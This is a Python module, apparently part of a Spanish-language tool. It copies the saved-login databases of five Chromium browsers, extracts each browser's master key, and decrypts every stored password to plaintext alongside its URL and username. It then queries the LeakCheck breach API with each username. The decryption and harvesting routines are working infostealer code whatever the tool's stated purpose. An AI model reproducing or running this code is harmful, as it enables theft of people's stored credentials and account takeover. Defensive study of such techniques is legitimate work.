# credentials.py
import sqlite3, hashlib, io, re, requests
import win32crypt
from Crypto.Cipher import AES
from utils import temporary_copy, get_full_path, extract_key_from_local_state
from config import RED, GREEN, BROWSER_PATHS, RESET
import os

def get_local_state_path(browser_name):
    browser = browser_name.lower()
    user_home = os.path.expanduser("~")
    if browser in BROWSER_PATHS and "local_state" in BROWSER_PATHS[browser]:
        return os.path.join(user_home, BROWSER_PATHS[browser]["local_state"])
    return None

def get_master_key(browser):
    browser = browser.lower()
    local_state_path = get_local_state_path(browser)
    if not local_state_path or not os.path.exists(local_state_path):
        raise Exception(f"Local State no encontrado para {browser}")
    return extract_key_from_local_state(local_state_path)

def is_valid_email(email):
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
    return re.match(email_regex, email) is not None
def check_leak_api(credential):
    """
    Llama a la API de LeakCheck con la credencial (email o password).
    Retorna un string indicando si está filtrada o no, sin incluir secuencias ANSI.
    """
    try:
        api_url = "https://leakcheck.net/api/public"
        if is_valid_email(credential):
            hashed_email = hashlib.sha256(credential.encode()).hexdigest()[:24]
            payload = {"check": hashed_email}
        else:
            payload = {"check": credential}

        response = requests.get(api_url, params=payload)
        if response.status_code == 200:
            data = response.json()
            if data['success']:
                if data['found'] > 0:
                    result = (
                        f"{RED}LEAKED\n"
                        f"Encontrado en {data['found']} brechas\n"
                        f"Campos: {', '.join(data['fields'])}\nFuentes:"
                    )
                    for source in data['sources']:
                        result += f"\n {RED}- {source['name']} (Fecha: {source['date']}){RESET}"
                else:
                    result = f"{GREEN}NOT LEAKED{RESET}"
            else:
                result = f"{RED}Error en API: {data.get('error', 'Desconocido')}{RESET}"
        else:
            result = f"{RED}HTTP {response.status_code}: {response.text}{RESET}"
    except Exception as e:
        result = f"{RED}Error consultando LeakCheck: {e}{RESET}"

    # Limpiar las secuencias ANSI
    result = re.sub(r'\033\[[0-9;]*m', '', result)
    return result
def password_decryption(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        ciphertext = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(ciphertext)[:-16].decode()
        return decrypted
    except:
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def process_passwords_for_browser(browser):
    results = []
    try:
        key = get_master_key(browser)
    except Exception as e:
        print(f"{RED}[{browser.capitalize()}] Error obteniendo la master key: {e}{RESET}")
        return results
    db_path = get_full_path(browser, "logins")
    if not db_path or not os.path.exists(db_path):
        print(f"{RED}[{browser.capitalize()}] No se encontró la base de datos de credenciales en: {db_path}{RESET}")
        return results
    with temporary_copy(db_path, suffix=f"_{browser}_LoginData_Copy.db") as temp_db:
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                main_url, login_page_url, user_name, encrypted_password = row
                decrypted_password = password_decryption(encrypted_password, key)
                if user_name or decrypted_password:
                    info = {
                        "browser": browser.capitalize(),
                        "main_url": main_url,
                        "login_url": login_page_url,
                        "user": user_name,
                        "password": decrypted_password
                    }
                    results.append(info)
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"{RED}[{browser.capitalize()}] Error extrayendo credenciales: {e}{RESET}")
    return results

def extract_credentials_chromium():
    browser_list = ["chrome", "edge", "brave", "opera", "vivaldi"]
    all_credentials = []
    for browser in browser_list:
        creds = process_passwords_for_browser(browser)
        if creds:
            print(f"{GREEN}[{browser.capitalize()}] Se extrajeron {len(creds)} credenciales.{RESET}")
            all_credentials.extend(creds)
        else:
            print(f"{RED}[{browser.capitalize()}] No se encontraron credenciales (o no está instalado).{RESET}")
    return all_credentials
def check_leaks_for_credentials(credentials):
    output = io.StringIO()
    output.write("=== Análisis de fugas con CheckLeak ===\n\n")
    count = 0
    for cred in credentials:
        user = cred["user"]
        # Solo se verifica el leak para el usuario (correo o username)
        if user:
            result_user = check_leak_api(user)
            output.write(f"[Usuario: {user}] => {result_user}\n\n")
            count += 1
    if not count:
        output.write("No había credenciales que verificar.\n")
    return output.getvalue()

